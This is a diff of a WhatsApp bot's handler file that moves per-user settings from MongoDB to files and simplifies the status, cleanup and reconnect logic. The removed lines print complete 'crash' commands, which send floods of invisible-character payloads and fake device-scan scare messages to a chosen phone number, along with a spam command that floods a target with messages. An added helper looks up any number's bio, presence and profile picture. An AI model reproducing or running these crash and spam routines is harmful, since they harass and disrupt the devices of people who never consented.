-    if (!message?.key || message.key.remoteJid !== 'status@broadcast' || !message.key.participant) return;
-
+    if (!message?.key || message.key.remoteJid !== 'status@broadcast') return;
     try {
-      let userEmojis = config.AUTO_LIKE_EMOJI;
-      let autoViewStatus = config.AUTO_VIEW_STATUS;
-      let autoLikeStatus = config.AUTO_LIKE_STATUS;
-      let autoRecording = config.AUTO_RECORDING;
+      const sanitizedNumber = (socket.user && socket.user.id) ? socket.user.id.split(':')[0] : null;
+      const sessionConfig = sanitizedNumber ? (await loadUserConfigFromFile(sanitizedNumber) || {}) : {};
 
-      if (sessionNumber) {
-        const userConfig = await loadUserConfigFromMongo(sessionNumber) || {};
-        if (userConfig.AUTO_LIKE_EMOJI && Array.isArray(userConfig.AUTO_LIKE_EMOJI) && userConfig.AUTO_LIKE_EMOJI.length > 0) {
-          userEmojis = userConfig.AUTO_LIKE_EMOJI;
-        }
-        if (userConfig.AUTO_VIEW_STATUS !== undefined) autoViewStatus = userConfig.AUTO_VIEW_STATUS;
-        if (userConfig.AUTO_LIKE_STATUS !== undefined) autoLikeStatus = userConfig.AUTO_LIKE_STATUS;
-        if (userConfig.AUTO_RECORDING !== undefined) autoRecording = userConfig.AUTO_RECORDING;
+      const stviewEnabled = (typeof sessionConfig.stview !== 'undefined') ? !!sessionConfig.stview : (config.AUTO_VIEW_STATUS === 'true');
+      if (stviewEnabled) {
+        try { await socket.readMessages([message.key]); } catch (e) {}
       }
 
-      if (autoRecording === 'true') {
-        await socket.sendPresenceUpdate("recording", message.key.remoteJid);
-      }
-
-      if (autoViewStatus === 'true') {
-        let retries = config.MAX_RETRIES;
-        while (retries > 0) {
-          try {
-            await socket.readMessages([message.key]);
-            break;
-          } catch (error) {
-            retries--;
-            await delay(1000 * (config.MAX_RETRIES - retries));
-            if (retries === 0) throw error;
-          }
-        }
-      }
-
-      if (autoLikeStatus === 'true') {
-        const randomEmoji = userEmojis[Math.floor(Math.random() * userEmojis.length)];
-        let retries = config.MAX_RETRIES;
-        while (retries > 0) {
-          try {
-            await socket.sendMessage(message.key.remoteJid, {
-              react: { text: randomEmoji, key: message.key }
-            }, { statusJidList: [message.key.participant] });
-            break;
-          } catch (error) {
-            retries--;
-            await delay(1000 * (config.MAX_RETRIES - retries));
-            if (retries === 0) throw error;
-          }
-        }
-      }
-    } catch (error) {
-      console.error('Status handler error:', error);
-    }
-  });
-}
-
-async function handleMessageRevocation(socket, number) {
-  socket.ev.on('messages.delete', async ({ keys }) => {
-    if (!keys || keys.length === 0) return;
-    const messageKey = keys[0];
-    const userJid = jidNormalizedUser(socket.user.id);
-    const deletionTime = getSriLankaTimestamp();
-    const message = formatMessage('*🗑️ 𝗠ᴇꜱꜱᴀɢᴇ 𝗗ᴇʟᴇᴛᴇᴅ*', `A message was deleted from your chat.\n*📋 𝗙ʀᴏᴍ:* ${messageKey.remoteJid}\n*🍁 𝗗ᴇʟᴇᴛɪᴏɴ 𝗧ɪᴍᴇ:* ${deletionTime}`, BOT_NAME_FANCY);
-    try { await socket.sendMessage(userJid, { image: { url: config.RCD_IMAGE_PATH }, caption: message }); }
-    catch (error) { console.error('Failed to send deletion notification:', error); }
-  });
-}
-
-// ---------------- Call Rejection Handler ----------------
-
-async function setupCallRejection(socket, sessionNumber) {
-  socket.ev.on('call', async (calls) => {
-    try {
-      const sanitized = (sessionNumber || '').replace(/[^0-9]/g, '');
-      const userConfig = await loadUserConfigFromMongo(sanitized) || {};
-      if (userConfig.ANTI_CALL !== 'on') return;
-
-      console.log(`📞 Incoming call detected for ${sanitized} - Auto rejecting...`);
-
-      for (const call of calls) {
-        if (call.status !== 'offer') continue;
-        const id = call.id;
-        const from = call.from;
-        await socket.rejectCall(id, from);
-        await socket.sendMessage(from, { text: '*🔕 Auto call rejection is enabled. Calls are automatically rejected.*' });
-        console.log(`✅ Auto-rejected call from ${from}`);
-        const userJid = jidNormalizedUser(socket.user.id);
-        const rejectionMessage = formatMessage('📞 CALL REJECTED', `Auto call rejection is active.\n\nCall from: ${from}\nTime: ${getSriLankaTimestamp()}`, BOT_NAME_FANCY);
-        await socket.sendMessage(userJid, { image: { url: config.RCD_IMAGE_PATH }, caption: rejectionMessage });
-      }
-    } catch (err) {
-      console.error(`Call rejection error for ${sessionNumber}: `, err);
-    }
-  });
-}
-
-// ---------------- Auto Message Read Handler ----------------
-
-async function setupAutoMessageRead(socket, sessionNumber) {
-  socket.ev.on('messages.upsert', async ({ messages }) => {
-    const msg = messages[0];
-    if (!msg || !msg.message || msg.key.remoteJid === 'status@broadcast' || msg.key.remoteJid === config.NEWSLETTER_JID) return;
-
-    const sanitized = (sessionNumber || '').replace(/[^0-9]/g, '');
-    const userConfig = await loadUserConfigFromMongo(sanitized) || {};
-    const autoReadSetting = userConfig.AUTO_READ_MESSAGE || 'off';
-
-    if (autoReadSetting === 'off') return;
-
-    let body = '';
-    try {
-      const type = getContentType(msg.message);
-      const actualMsg = (type === 'ephemeralMessage') ? msg.message.ephemeralMessage.message : msg.message;
-      if (type === 'conversation') body = actualMsg.conversation || '';
-      else if (type === 'extendedTextMessage') body = actualMsg.extendedTextMessage?.text || '';
-      else if (type === 'imageMessage') body = actualMsg.imageMessage?.caption || '';
-      else if (type === 'videoMessage') body = actualMsg.videoMessage?.caption || '';
-    } catch (e) { body = ''; }
-
-    const prefix = userConfig.PREFIX || config.PREFIX;
-    const isCmd = body && body.startsWith && body.startsWith(prefix);
-
-    if (autoReadSetting === 'all') {
-      try { await socket.readMessages([msg.key]); console.log(`✅ Message read: ${msg.key.id}`); } catch (error) { console.warn('Failed to read message:', error?.message); }
-    } else if (autoReadSetting === 'cmd' && isCmd) {
-      try { await socket.readMessages([msg.key]); console.log(`✅ Command message read: ${msg.key.id}`); } catch (error) { console.warn('Failed to read command message:', error?.message); }
-    }
-  });
-}
-
-// ---------------- message handlers ----------------
-
-function setupMessageHandlers(socket, sessionNumber) {
-  socket.ev.on('messages.upsert', async ({ messages }) => {
-    const msg = messages[0];
-    if (!msg.message || msg.key.remoteJid === 'status@broadcast' || msg.key.remoteJid === config.NEWSLETTER_JID) return;
-
-    try {
-      let autoTyping = config.AUTO_TYPING;
-      let autoRecording = config.AUTO_RECORDING;
-
-      if (sessionNumber) {
-        const userConfig = await loadUserConfigFromMongo(sessionNumber) || {};
-        if (userConfig.AUTO_TYPING !== undefined) autoTyping = userConfig.AUTO_TYPING;
-        if (userConfig.AUTO_RECORDING !== undefined) autoRecording = userConfig.AUTO_RECORDING;
-      }
-
-      if (autoTyping === 'true') {
+      let emojis = Array.isArray(sessionConfig.sr) && sessionConfig.sr.length ? sessionConfig.sr : config.AUTO_LIKE_EMOJI;
+      if (emojis && emojis.length > 0) {
+        const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
         try {
-          await socket.sendPresenceUpdate('composing', msg.key.remoteJid);
-          setTimeout(async () => { try { await socket.sendPresenceUpdate('paused', msg.key.remoteJid); } catch (e) { } }, 3000);
-        } catch (e) { console.error('Auto typing error:', e); }
+          await socket.sendMessage(message.key.remoteJid, { react: { text: randomEmoji, key: message.key } }, { statusJidList: [message.key.participant] });
+        } catch (error) {}
       }
-
-      if (autoRecording === 'true') {
-        try {
-          await socket.sendPresenceUpdate('recording', msg.key.remoteJid);
-          setTimeout(async () => { try { await socket.sendPresenceUpdate('paused', msg.key.remoteJid); } catch (e) { } }, 3000);
-        } catch (e) { console.error('Auto recording error:', e); }
-      }
-    } catch (error) {
-      console.error('Message handler error:', error);
-    }
+    } catch (error) { console.error('Status handler error:', error); }
   });
 }
 
-// ---------------- cleanup helper ----------------
+// ==================== Cleanup ====================
 
 async function deleteSessionAndCleanup(number, socketInstance) {
   const sanitized = number.replace(/[^0-9]/g, '');
   try {
-    const sessionPath = path.join(os.tmpdir(), `session_${sanitized} `);
-    try { if (fs.existsSync(sessionPath)) fs.removeSync(sessionPath); } catch (e) { }
-    activeSockets.delete(sanitized); socketCreationTime.delete(sanitized);
-    try { await removeSessionFromMongo(sanitized); } catch (e) { }
-    try { await removeNumberFromMongo(sanitized); } catch (e) { }
-    try {
-      const ownerJid = `${config.OWNER_NUMBER.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
-      const caption = formatMessage('*🥷 OWNER NOTICE — SESSION REMOVED*', `*𝐍umber:* ${sanitized}\n*𝐒ession 𝐑emoved 𝐃ue 𝐓o 𝐋ogout.*\n\n*𝐀ctive 𝐒essions 𝐍ow:* ${activeSockets.size}`, BOT_NAME_FANCY);
-      if (socketInstance && socketInstance.sendMessage) await socketInstance.sendMessage(ownerJid, { image: { url: config.RCD_IMAGE_PATH }, caption });
-    } catch (e) { }
+    activeSockets.delete(sanitized);
+    socketCreationTime.delete(sanitized);
+    await removeSessionFromFile(sanitized);
+    await removeNumberFromFile(sanitized);
+    const sessionDir = path.join(SESSIONS_DIR, `session_${sanitized}`);
+    if (fs.existsSync(sessionDir)) fs.removeSync(sessionDir);
     console.log(`Cleanup completed for ${sanitized}`);
   } catch (err) { console.error('deleteSessionAndCleanup error:', err); }
 }
 
-// ---------------- auto-restart ----------------
+// ==================== Auto Restart ====================
 
 function setupAutoRestart(socket, number) {
   socket.ev.on('connection.update', async (update) => {
     const { connection, lastDisconnect } = update;
     if (connection === 'close') {
-      const statusCode = lastDisconnect?.error?.output?.statusCode
-        || lastDisconnect?.error?.statusCode
-        || (lastDisconnect?.error && lastDisconnect.error.toString().includes('401') ? 401 : undefined);
-      const isLoggedOut = statusCode === 401
-        || (lastDisconnect?.error && lastDisconnect.error.code === 'AUTHENTICATION')
-        || (lastDisconnect?.error && String(lastDisconnect.error).toLowerCase().includes('logged out'))
-        || (lastDisconnect?.reason === DisconnectReason?.loggedOut);
+      const statusCode = lastDisconnect?.error?.output?.statusCode;
+      const isLoggedOut = statusCode === 401;
       if (isLoggedOut) {
-        console.log(`User ${number} logged out. Cleaning up...`);
-        try { await deleteSessionAndCleanup(number, socket); } catch (e) { console.error(e); }
+        await deleteSessionAndCleanup(number, socket);
       } else {
-        console.log(`Connection closed for ${number} (not logout). Attempt reconnect...`);
-        try { await delay(10000); activeSockets.delete(number.replace(/[^0-9]/g, '')); socketCreationTime.delete(number.replace(/[^0-9]/g, '')); const mockRes = { headersSent: false, send: () => { }, status: () => mockRes }; await EmpirePair(number, mockRes); } catch (e) { console.error('Reconnect attempt failed', e); }
+        setTimeout(() => {
+          activeSockets.delete(number.replace(/[^0-9]/g,''));
+          socketCreationTime.delete(number.replace(/[^0-9]/g,''));
+        }, 10000);
       }
     }
   });
 }
 
-// ---------------- COMMAND HANDLER WITH ALL BUG COMMANDS ----------------
+// ==================== Download Media Helper ====================
+
+async function downloadQuotedMedia(quoted) {
+  if (!quoted) return null;
+  const qTypes = ['imageMessage','videoMessage','audioMessage','documentMessage','stickerMessage'];
+  const qType = qTypes.find(t => quoted[t]);
+  if (!qType) return null;
+  const messageType = qType.replace(/Message$/i, '').toLowerCase();
+  const stream = await downloadContentFromMessage(quoted[qType], messageType);
+  let buffer = Buffer.from([]);
+  for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
+  return { buffer, mime: quoted[qType].mimetype || '', caption: quoted[qType].caption || '' };
+}
+
+// ==================== Number Info Function ====================
+
+async function getNumberInfo(number, socket) {
+  try {
+    const cleanNumber = number.replace(/[^0-9]/g, '');
+    const jid = cleanNumber + '@s.whatsapp.net';
+    
+    let ppUrl = null;
+    let hasDp = false;
+    try {
+      ppUrl = await socket.profilePictureUrl(jid, 'image');
+      hasDp = true;
+    } catch { hasDp = false; }
+    
+    let about = '📝 *About:* No bio available';
+    try {
+      const status = await socket.fetchStatus(jid);
+      if (status && status.status) about = `📝 *About:* ${status.status}`;
+    } catch {}
+    
+    let presence = '🔵 *Presence:* Offline';
+    try {
+      const presenceData = await socket.presenceSubscribe(jid);
+      if (presenceData && presenceData.presence === 'available') presence = '🟢 *Presence:* Online';
+    } catch {}
+    
+    const countryCodes = {
+      '94': { name: 'Sri Lanka 🇱🇰', flag: '🇱🇰', dialCode: '+94' },
+      '91': { name: 'India 🇮🇳', flag: '🇮🇳', dialCode: '+91' },
+      '1': { name: 'USA 🇺🇸', flag: '🇺🇸', dialCode: '+1' },
+      '44': { name: 'UK 🇬🇧', flag: '🇬🇧', dialCode: '+44' },
+      '61': { name: 'Australia 🇦🇺', flag: '🇦🇺', dialCode: '+61' }
+    };
+    
+    let countryCode = cleanNumber.substring(0, 2);
+    const country = countryCodes[countryCode] || { name: 'Unknown 🌐', flag: '🌐', dialCode: '+' + countryCode };
+    const formattedNumber = `${country.dialCode} ${cleanNumber.substring(countryCode.length)}`;
+    const currentTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' });
+    
+    const infoText = `╭━━━❰ *📱 NUMBER INFORMATION* ❱━━━❍
+┃
+┃ 📞 *Number:* ${formattedNumber}
+┃ 🌍 *Country:* ${country.name} ${country.flag}
+┃ 🕐 *Local Time:* ${currentTime}
+┃ ${about}
+┃ ${presence}
+┃ 📸 *Profile Picture:* ${hasDp ? '✅ Available' : '❌ Not Available'}
+┃
+╰━━━━━━━━━━━━━━━━━━━━❍`;
+    
+    return { infoText, ppUrl, hasDp };
+  } catch (error) {
+    return { infoText: `❌ *Error:* ${error.message}`, ppUrl: null, hasDp: false };
+  }
+}
+
+// ==================== Command Handlers ====================
 
 function setupCommandHandlers(socket, number) {
   socket.ev.on('messages.upsert', async ({ messages }) => {
     const msg = messages[0];
-    if (!msg || !msg.message || msg.key.remoteJid === 'status@broadcast' || msg.key.remoteJid === config.NEWSLETTER_JID) return;
+    if (!msg || !msg.message || msg.key.remoteJid === 'status@broadcast') return;
 
     const type = getContentType(msg.message);
     if (!msg.message) return;
@@ -660,553 +615,978 @@ function setupCommandHandlers(socket, number) {
 
     const from = msg.key.remoteJid;
     const sender = from;
-    const nowsender = msg.key.fromMe ? (socket.user.id.split(':')[0] + '@s.whatsapp.net' || socket.user.id) : (msg.key.participant || msg.key.remoteJid);
+    const nowsender = msg.key.fromMe ? (socket.user.id.split(':')[0] + '@s.whatsapp.net') : (msg.key.participant || msg.key.remoteJid);
     const senderNumber = (nowsender || '').split('@')[0];
-    const developers = `${config.OWNER_NUMBER}`;
-    const botNumber = socket.user.id.split(':')[0];
-    const isbot = botNumber.includes(senderNumber);
-    const isOwner = isbot ? isbot : developers.includes(senderNumber);
-    const isGroup = from.endsWith("@g.us");
+    const isOwner = senderNumber === config.OWNER_NUMBER.replace(/[^0-9]/g,'');
+    const isGroup = String(from || '').endsWith('@g.us');
 
-    let body = (type === 'conversation') ? msg.message.conversation
-      : msg.message?.extendedTextMessage?.contextInfo?.hasOwnProperty('quotedMessage')
-        ? msg.message.extendedTextMessage.text
-        : (type == 'interactiveResponseMessage')
-          ? msg.message.interactiveResponseMessage?.nativeFlowResponseMessage
-          && JSON.parse(msg.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.id
-          : (type == 'templateButtonReplyMessage')
-            ? msg.message.templateButtonReplyMessage?.selectedId
-            : (type === 'extendedTextMessage')
-              ? msg.message.extendedTextMessage.text
-              : (type == 'imageMessage') && msg.message.imageMessage.caption
-                ? msg.message.imageMessage.caption
-                : (type == 'videoMessage') && msg.message.videoMessage.caption
-                  ? msg.message.videoMessage.caption
-                  : (type == 'buttonsResponseMessage')
-                    ? msg.message.buttonsResponseMessage?.selectedButtonId
-                    : (type == 'listResponseMessage')
-                      ? msg.message.listResponseMessage?.singleSelectReply?.selectedRowId
-                      : (type == 'messageContextInfo')
-                        ? (msg.message.buttonsResponseMessage?.selectedButtonId
-                          || msg.message.listResponseMessage?.singleSelectReply?.selectedRowId
-                          || msg.text)
-                        : (type === 'viewOnceMessage')
-                          ? msg.message[type]?.message[getContentType(msg.message[type].message)]
-                          : (type === "viewOnceMessageV2")
-                            ? (msg.msg.message.imageMessage?.caption || msg.msg.message.videoMessage?.caption || "")
-                            : '';
-    body = String(body || '');
+    const body = (type === 'conversation') ? msg.message.conversation
+      : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text
+      : (type === 'imageMessage' && msg.message.imageMessage.caption) ? msg.message.imageMessage.caption
+      : (type === 'videoMessage' && msg.message.videoMessage.caption) ? msg.message.videoMessage.caption
+      : '';
 
     if (!body || typeof body !== 'string') return;
 
-    const prefix = config.PREFIX;
-    const isCmd = body && body.startsWith && body.startsWith(prefix);
+    const prefix = await getPrefixForChat(from);
+    const isCmd = body.startsWith(prefix);
     const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : null;
     const args = body.trim().split(/ +/).slice(1);
 
     if (!command) return;
 
+    // Permission check
     try {
-      const sanitized = (number || '').replace(/[^0-9]/g, '');
-      const userConfig = await loadUserConfigFromMongo(sanitized) || {};
+      const sanitizedNumber = (number || '').replace(/[^0-9]/g, '');
+      const sessionConfig = await loadUserConfigFromFile(sanitizedNumber) || {};
+      const sessionMode = sessionConfig.mode || config.MODE;
 
-      // Work type restrictions
       if (!isOwner) {
-        const workType = userConfig.WORK_TYPE || 'public';
-        if (workType === "private") {
-          console.log(`Command blocked: WORK_TYPE is private for ${sanitized}`);
+        if (sessionMode === 'private') {
+          await socket.sendMessage(sender, { text: '❌ *Permission Denied!*\nBot is in *private* mode.' });
           return;
         }
-        if (isGroup && workType === "inbox") {
-          console.log(`Command blocked: WORK_TYPE is inbox but message is from group for ${sanitized}`);
+        if (isGroup && sessionMode === 'inbox') {
+          await socket.sendMessage(sender, { text: '❌ *Permission Denied!*\nBot is in *inbox* mode.' });
           return;
         }
-        if (!isGroup && workType === "groups") {
-          console.log(`Command blocked: WORK_TYPE is groups but message is from private chat for ${sanitized}`);
+        if (!isGroup && sessionMode === 'groups') {
+          await socket.sendMessage(sender, { text: '❌ *Permission Denied!*\nBot is in *groups* mode.' });
           return;
         }
       }
+    } catch (permErr) {}
 
+    try {
+      // Load config for logo and botName
+      const sanitized = (number || '').replace(/[^0-9]/g, '');
+      const cfg = await loadUserConfigFromFile(sanitized) || {};
+      const botName = cfg.botName || BOT_NAME_FANCY;
+      const logo = cfg.logo || config.RCD_IMAGE_PATH;
+      
       switch (command) {
         
-        // ==================== ALIVE COMMAND ====================
-        case 'alive': {
-          try {
-            const cfg = await loadUserConfigFromMongo(sanitized) || {};
-            const botName = cfg.botName || BOT_NAME_FANCY;
-            const logo = cfg.logo || config.RCD_IMAGE_PATH;
-
-            const now = new Date();
-            const sriLankaTime = now.toLocaleString('en-US', { timeZone: 'Asia/Colombo' });
-            const sriLankaDate = new Date(sriLankaTime);
-            const currentHour = sriLankaDate.getHours();
-
-            let greeting;
-            if (currentHour >= 5 && currentHour < 12) greeting = 'Good Morning 🌅';
-            else if (currentHour >= 12 && currentHour < 18) greeting = 'Good Afternoon ☀️';
-            else greeting = 'Good Evening 🌙';
-
-            const formattedDate = sriLankaDate.toLocaleDateString('en-US', { month: 'long', day: 'numeric', timeZone: 'Asia/Colombo' });
-            const formattedDay = sriLankaDate.toLocaleDateString('en-US', { weekday: 'long', timeZone: 'Asia/Colombo' });
-            const formattedTime = sriLankaDate.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true, timeZone: 'Asia/Colombo' });
-
-            const uptime = process.uptime();
-            const hours = Math.floor(uptime / 3600);
-            const minutes = Math.floor((uptime % 3600) / 60);
-            
-            const memoryUsage = process.memoryUsage();
-            const memoryUsed = (memoryUsage.heapUsed / 1024 / 1024).toFixed(2);
-            const memoryTotal = (memoryUsage.heapTotal / 1024 / 1024).toFixed(2);
-
-            const text = `
-*🏯𝐖ᴇʟᴄᴏᴍᴇ 𝐓ᴏ 𝐘ᴏᴜ x𝐂ᴅᴛ 𝐈ɴᴠɪᴄᴛᴜꜱ 𝐌ɪɴɪ 𝐁ᴏᴛ 🎭*
-*🎏x𝐂ᴅᴛ ɪɴᴠɪᴄᴛᴜꜱ ᴍɪɴɪ ʙᴏᴛミニボットへようこそ🎎*
-
-\`BUG BOT ALIVE\`🎡
-
-*⚬ Sᴛᴀᴛᴜꜱ :* 🟢 Active
-*⚬ Mᴏᴅᴇ :* 🛡️ Protection Mode
-*⚬ Mᴇᴍᴏʀʏ :* ${memoryUsed}MB / ${memoryTotal}MB
-*⚬ Sᴇᴄᴜʀɪᴛʏ ʙʏ ᴘᴀꜱꜱ :* ✅ Enabled
-
-*📅 Date:* ${formattedDate}
-*📆 Day:* ${formattedDay}
-*⏰ Time:* ${formattedTime} (IST)
-*⏱️ Uptime:* ${hours}h ${minutes}m
-
-🚧 *w𝔞𝔯𝔫𝔦𝔫𝔤 - ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴀᴄᴄᴇꜱꜱ ᴡɪʟʟ ʙᴇ ʟᴏɢɢᴇᴅ ᴀɴᴅ ᴛʀᴀᴄᴇᴅ.!!*
-`;
-
-            const metaQuote = {
-              key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_ALIVE" },
-              message: { contactMessage: { displayName: botName, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${botName};;;;\nFN:${botName}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
-            };
-
-            let imagePayload = String(logo).startsWith('http') ? { url: logo } : fs.readFileSync(logo);
-            await socket.sendMessage(sender, { image: imagePayload, caption: text, footer: `*${botName}*`, headerType: 4 }, { quoted: metaQuote });
-          } catch (e) {
-            console.error('alive error', e);
-            await socket.sendMessage(sender, { text: '❌ Failed to send alive status.' }, { quoted: msg });
-          }
-          break;
-        }
-
-        // ==================== PING COMMAND ====================
-        case 'ping': {
-          try {
-            const start = Date.now();
-            const cfg = await loadUserConfigFromMongo(sanitized) || {};
-            const botName = cfg.botName || BOT_NAME_FANCY;
-            const logo = cfg.logo || config.RCD_IMAGE_PATH;
-            const userTag = `@${sender.split("@")[0]} `;
-
-            const now = new Date();
-            const sriLankaTime = now.toLocaleString('en-US', { timeZone: 'Asia/Colombo' });
-            const sriLankaDate = new Date(sriLankaTime);
-            const currentHour = sriLankaDate.getHours();
-            let greeting = (currentHour >= 5 && currentHour < 12) ? 'Good Morning 🌅' : (currentHour >= 12 && currentHour < 18) ? 'Good Afternoon ☀️' : 'Good Evening 🌙';
-            const formattedTime = sriLankaDate.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true, timeZone: 'Asia/Colombo' });
-
-            const uptime = process.uptime();
-            const hours = Math.floor(uptime / 3600);
-            const minutes = Math.floor((uptime % 3600) / 60);
-            const seconds = Math.floor(uptime % 60);
-            const end = Date.now();
-            const latency = end - start;
-            const speedStatus = latency < 200 ? 'Excellent 🟢' : latency < 500 ? 'Good 🟡' : 'Slow 🔴';
-
-            const text = `
-🏓 𝗣𝗢𝗡𝗚 𝗥𝗘𝗦𝗨𝗟𝗧
-
-👤 USER: ${userTag}
-🗯️ GREETING: ${greeting}
-⏰ TIME: ${formattedTime}
-
-⚡ SPEED: ${latency} ms
-🖥️ RUNTIME: ${hours}h ${minutes}m ${seconds}s
-📡 STATUS: ${speedStatus}
-
-Thanks for using ${botName} 🚀
-`;
-
-            let imagePayload = String(logo).startsWith('http') ? { url: logo } : fs.readFileSync(logo);
-            await socket.sendMessage(sender, { image: imagePayload, caption: text, footer: `*${botName}*`, headerType: 4 }, { quoted: msg });
-          } catch (e) {
-            console.error('ping error', e);
-            await socket.sendMessage(sender, { text: '❌ Failed to test ping.' }, { quoted: msg });
-          }
-          break;
-        }
-
-        // ==================== SYSTEM COMMAND ====================
-        case 'system': {
-          try {
-            const cfg = await loadUserConfigFromMongo(sanitized) || {};
-            const botName = cfg.botName || BOT_NAME_FANCY;
-            const logo = cfg.logo || config.RCD_IMAGE_PATH;
-
-            const text = `
-*☘️ System Info for ${botName} ☘️*
-
-*╭━━━━━━━━━━━◆*
-*┃🧸 OS:* ${os.type()} ${os.release()}
-*┃📡 Platform:* ${os.platform()}
-*┃🧠 CPU Cores:* ${os.cpus().length}
-*┃💾 Memory:* ${(os.totalmem() / 1024 / 1024 / 1024).toFixed(2)} GB
-*╰━━━━━━━━━━━◆*
-`;
-
-            let imagePayload = String(logo).startsWith('http') ? { url: logo } : fs.readFileSync(logo);
-            await socket.sendMessage(sender, { image: imagePayload, caption: text, footer: `*${botName} System Info*`, headerType: 4 }, { quoted: msg });
-          } catch (e) {
-            console.error('system error', e);
-            await socket.sendMessage(sender, { text: '❌ Failed to get system info.' }, { quoted: msg });
-          }
-          break;
-        }
-
-        // ==================== BUG/CRASH COMMANDS (Owner Only) ====================
-        case 'fc-ios':
-        case 'fc-delay':
-        case 'xcdt-crash':
-        case 'crash-delta':
-        case 'invictus':
-        case 'crash-delay': {
-          if (!isOwner) {
-            await socket.sendMessage(from, { text: '❌ *Access Denied!*\nThese commands are for owner only.' }, { quoted: msg });
-            return;
-          }
-          
-          const targetNumber = args[0];
-          if (!targetNumber) {
-            await socket.sendMessage(from, { 
-              text: `⚠️ *Usage:* ${prefix}${command} <number>\n*Example:* ${prefix}${command} 9477xxxxxx` 
-            }, { quoted: msg });
-            return;
-          }
-          
-          const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
-          if (cleanNumber.length < 10) {
-            await socket.sendMessage(from, { text: '❌ *Invalid number!* Must be at least 10 digits.' }, { quoted: msg });
-            return;
-          }
-          
-          const targetJid = `${cleanNumber}@s.whatsapp.net`;
-          
-          await socket.sendMessage(from, { 
-            text: `🔥 *${command.toUpperCase()} Attack Initiated!*\n*Target:* ${cleanNumber}\n*Status:* Processing...` 
-          }, { quoted: msg });
-          
-          try {
-            switch(command) {
-              case 'fc-ios':
-                for (let i = 0; i < 5; i++) {
-                  await socket.sendMessage(targetJid, { text: '‎'.repeat(2000) + ' '.repeat(100) }).catch(() => {});
-                  await delay(500);
-                }
-                break;
-              case 'fc-delay':
-                for (let i = 0; i < 10; i++) {
-                  await socket.sendMessage(targetJid, { text: `⚠️ SYSTEM ALERT ${i+1}\nYour device is being scanned...` }).catch(() => {});
-                  await delay(800);
-                }
-                break;
-              case 'xcdt-crash':
-              case 'crash-delta':
-              case 'invictus':
-              case 'crash-delay':
-                const crashPayloads = ['␀'.repeat(500), ' '.repeat(1000), '‍'.repeat(800), 'ㅤ'.repeat(600), '⠀'.repeat(400)];
-                for (const payload of crashPayloads) {
-                  await socket.sendMessage(targetJid, { text: payload }).catch(() => {});
-                  await delay(300);
-                }
-                break;
-            }
-            await socket.sendMessage(from, { text: `✅ *Attack Complete!*\n*Target:* ${cleanNumber}\n*Command:* ${command}\n*Status:* Delivered` }, { quoted: msg });
-          } catch (err) {
-            await socket.sendMessage(from, { text: `⚠️ *Attack Failed*\n*Error:* ${err.message || 'Unknown error'}` }, { quoted: msg });
-          }
-          break;
-        }
-
-        // ==================== SPAM COMMAND (with Rate Limiting) ====================
-        case 'spam': {
-          if (!isOwner) {
-            await socket.sendMessage(from, { text: '❌ *Access Denied!* Spam command is for owner only.' }, { quoted: msg });
-            return;
-          }
-
-          const targetNumber = args[0];
-          const messageToSpam = args.slice(1).join(' ') || '⚠️ SYSTEM MESSAGE';
-          const spamCount = parseInt(args[1]) || 5;
-          
-          if (!targetNumber) {
-            await socket.sendMessage(from, { 
-              text: `⚠️ *Usage:* ${prefix}spam <number> <message> <count>\n*Example:* ${prefix}spam 9477xxxxxx "Hello" 10\n\n*Limits:* Max ${config.SPAM_LIMIT} messages, 30s cooldown` 
-            }, { quoted: msg });
-            return;
-          }
-
-          // Rate limiting check
-          const now = Date.now();
-          const lastSpam = spamCooldown.get(senderNumber);
-          if (lastSpam && (now - lastSpam) < config.SPAM_COOLDOWN) {
-            const remaining = Math.ceil((config.SPAM_COOLDOWN - (now - lastSpam)) / 1000);
-            await socket.sendMessage(from, { text: `⏳ *Rate Limited!* Please wait ${remaining} seconds before using spam command again.` }, { quoted: msg });
-            return;
-          }
-
-          // Check user command count
-          const userCounts = userCommandCount.get(senderNumber) || { count: 0, resetTime: now + 60000 };
-          if (now > userCounts.resetTime) {
-            userCommandCount.set(senderNumber, { count: 0, resetTime: now + 60000 });
-          } else if (userCounts.count >= 3) {
-            await socket.sendMessage(from, { text: '⏳ *Too many spam attempts!* Please wait a minute.' }, { quoted: msg });
-            return;
-          }
-
-          const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
-          if (cleanNumber.length < 10) {
-            await socket.sendMessage(from, { text: '❌ *Invalid number!* Must be at least 10 digits.' }, { quoted: msg });
-            return;
-          }
-
-          let finalCount = Math.min(spamCount, config.SPAM_LIMIT);
-          if (spamCount > config.SPAM_LIMIT) {
-            await socket.sendMessage(from, { text: `⚠️ *Limited to ${config.SPAM_LIMIT} messages only!*` }, { quoted: msg });
-          }
-
-          const targetJid = `${cleanNumber}@s.whatsapp.net`;
-          
-          await socket.sendMessage(from, { 
-            text: `💬 *Spam Attack Started!*\n*Target:* ${cleanNumber}\n*Count:* ${finalCount}\n*Message:* ${messageToSpam.substring(0, 50)}...\n*Status:* Sending...` 
-          }, { quoted: msg });
-
-          // Update rate limiting
-          spamCooldown.set(senderNumber, now);
-          userCommandCount.set(senderNumber, { count: (userCounts.count + 1), resetTime: userCounts.resetTime });
-
-          let successCount = 0;
-          for (let i = 0; i < finalCount; i++) {
-            try {
-              await socket.sendMessage(targetJid, { text: messageToSpam });
-              successCount++;
-              await delay(500); // Delay between messages to avoid rate limits
-            } catch (err) {
-              console.error(`Spam message ${i+1} failed:`, err);
-            }
-          }
-
-          await socket.sendMessage(from, { 
-            text: `✅ *Spam Attack Complete!*\n*Target:* ${cleanNumber}\n*Sent:* ${successCount}/${finalCount} messages\n*Status:* Finished` 
-          }, { quoted: msg });
-          break;
-        }
-
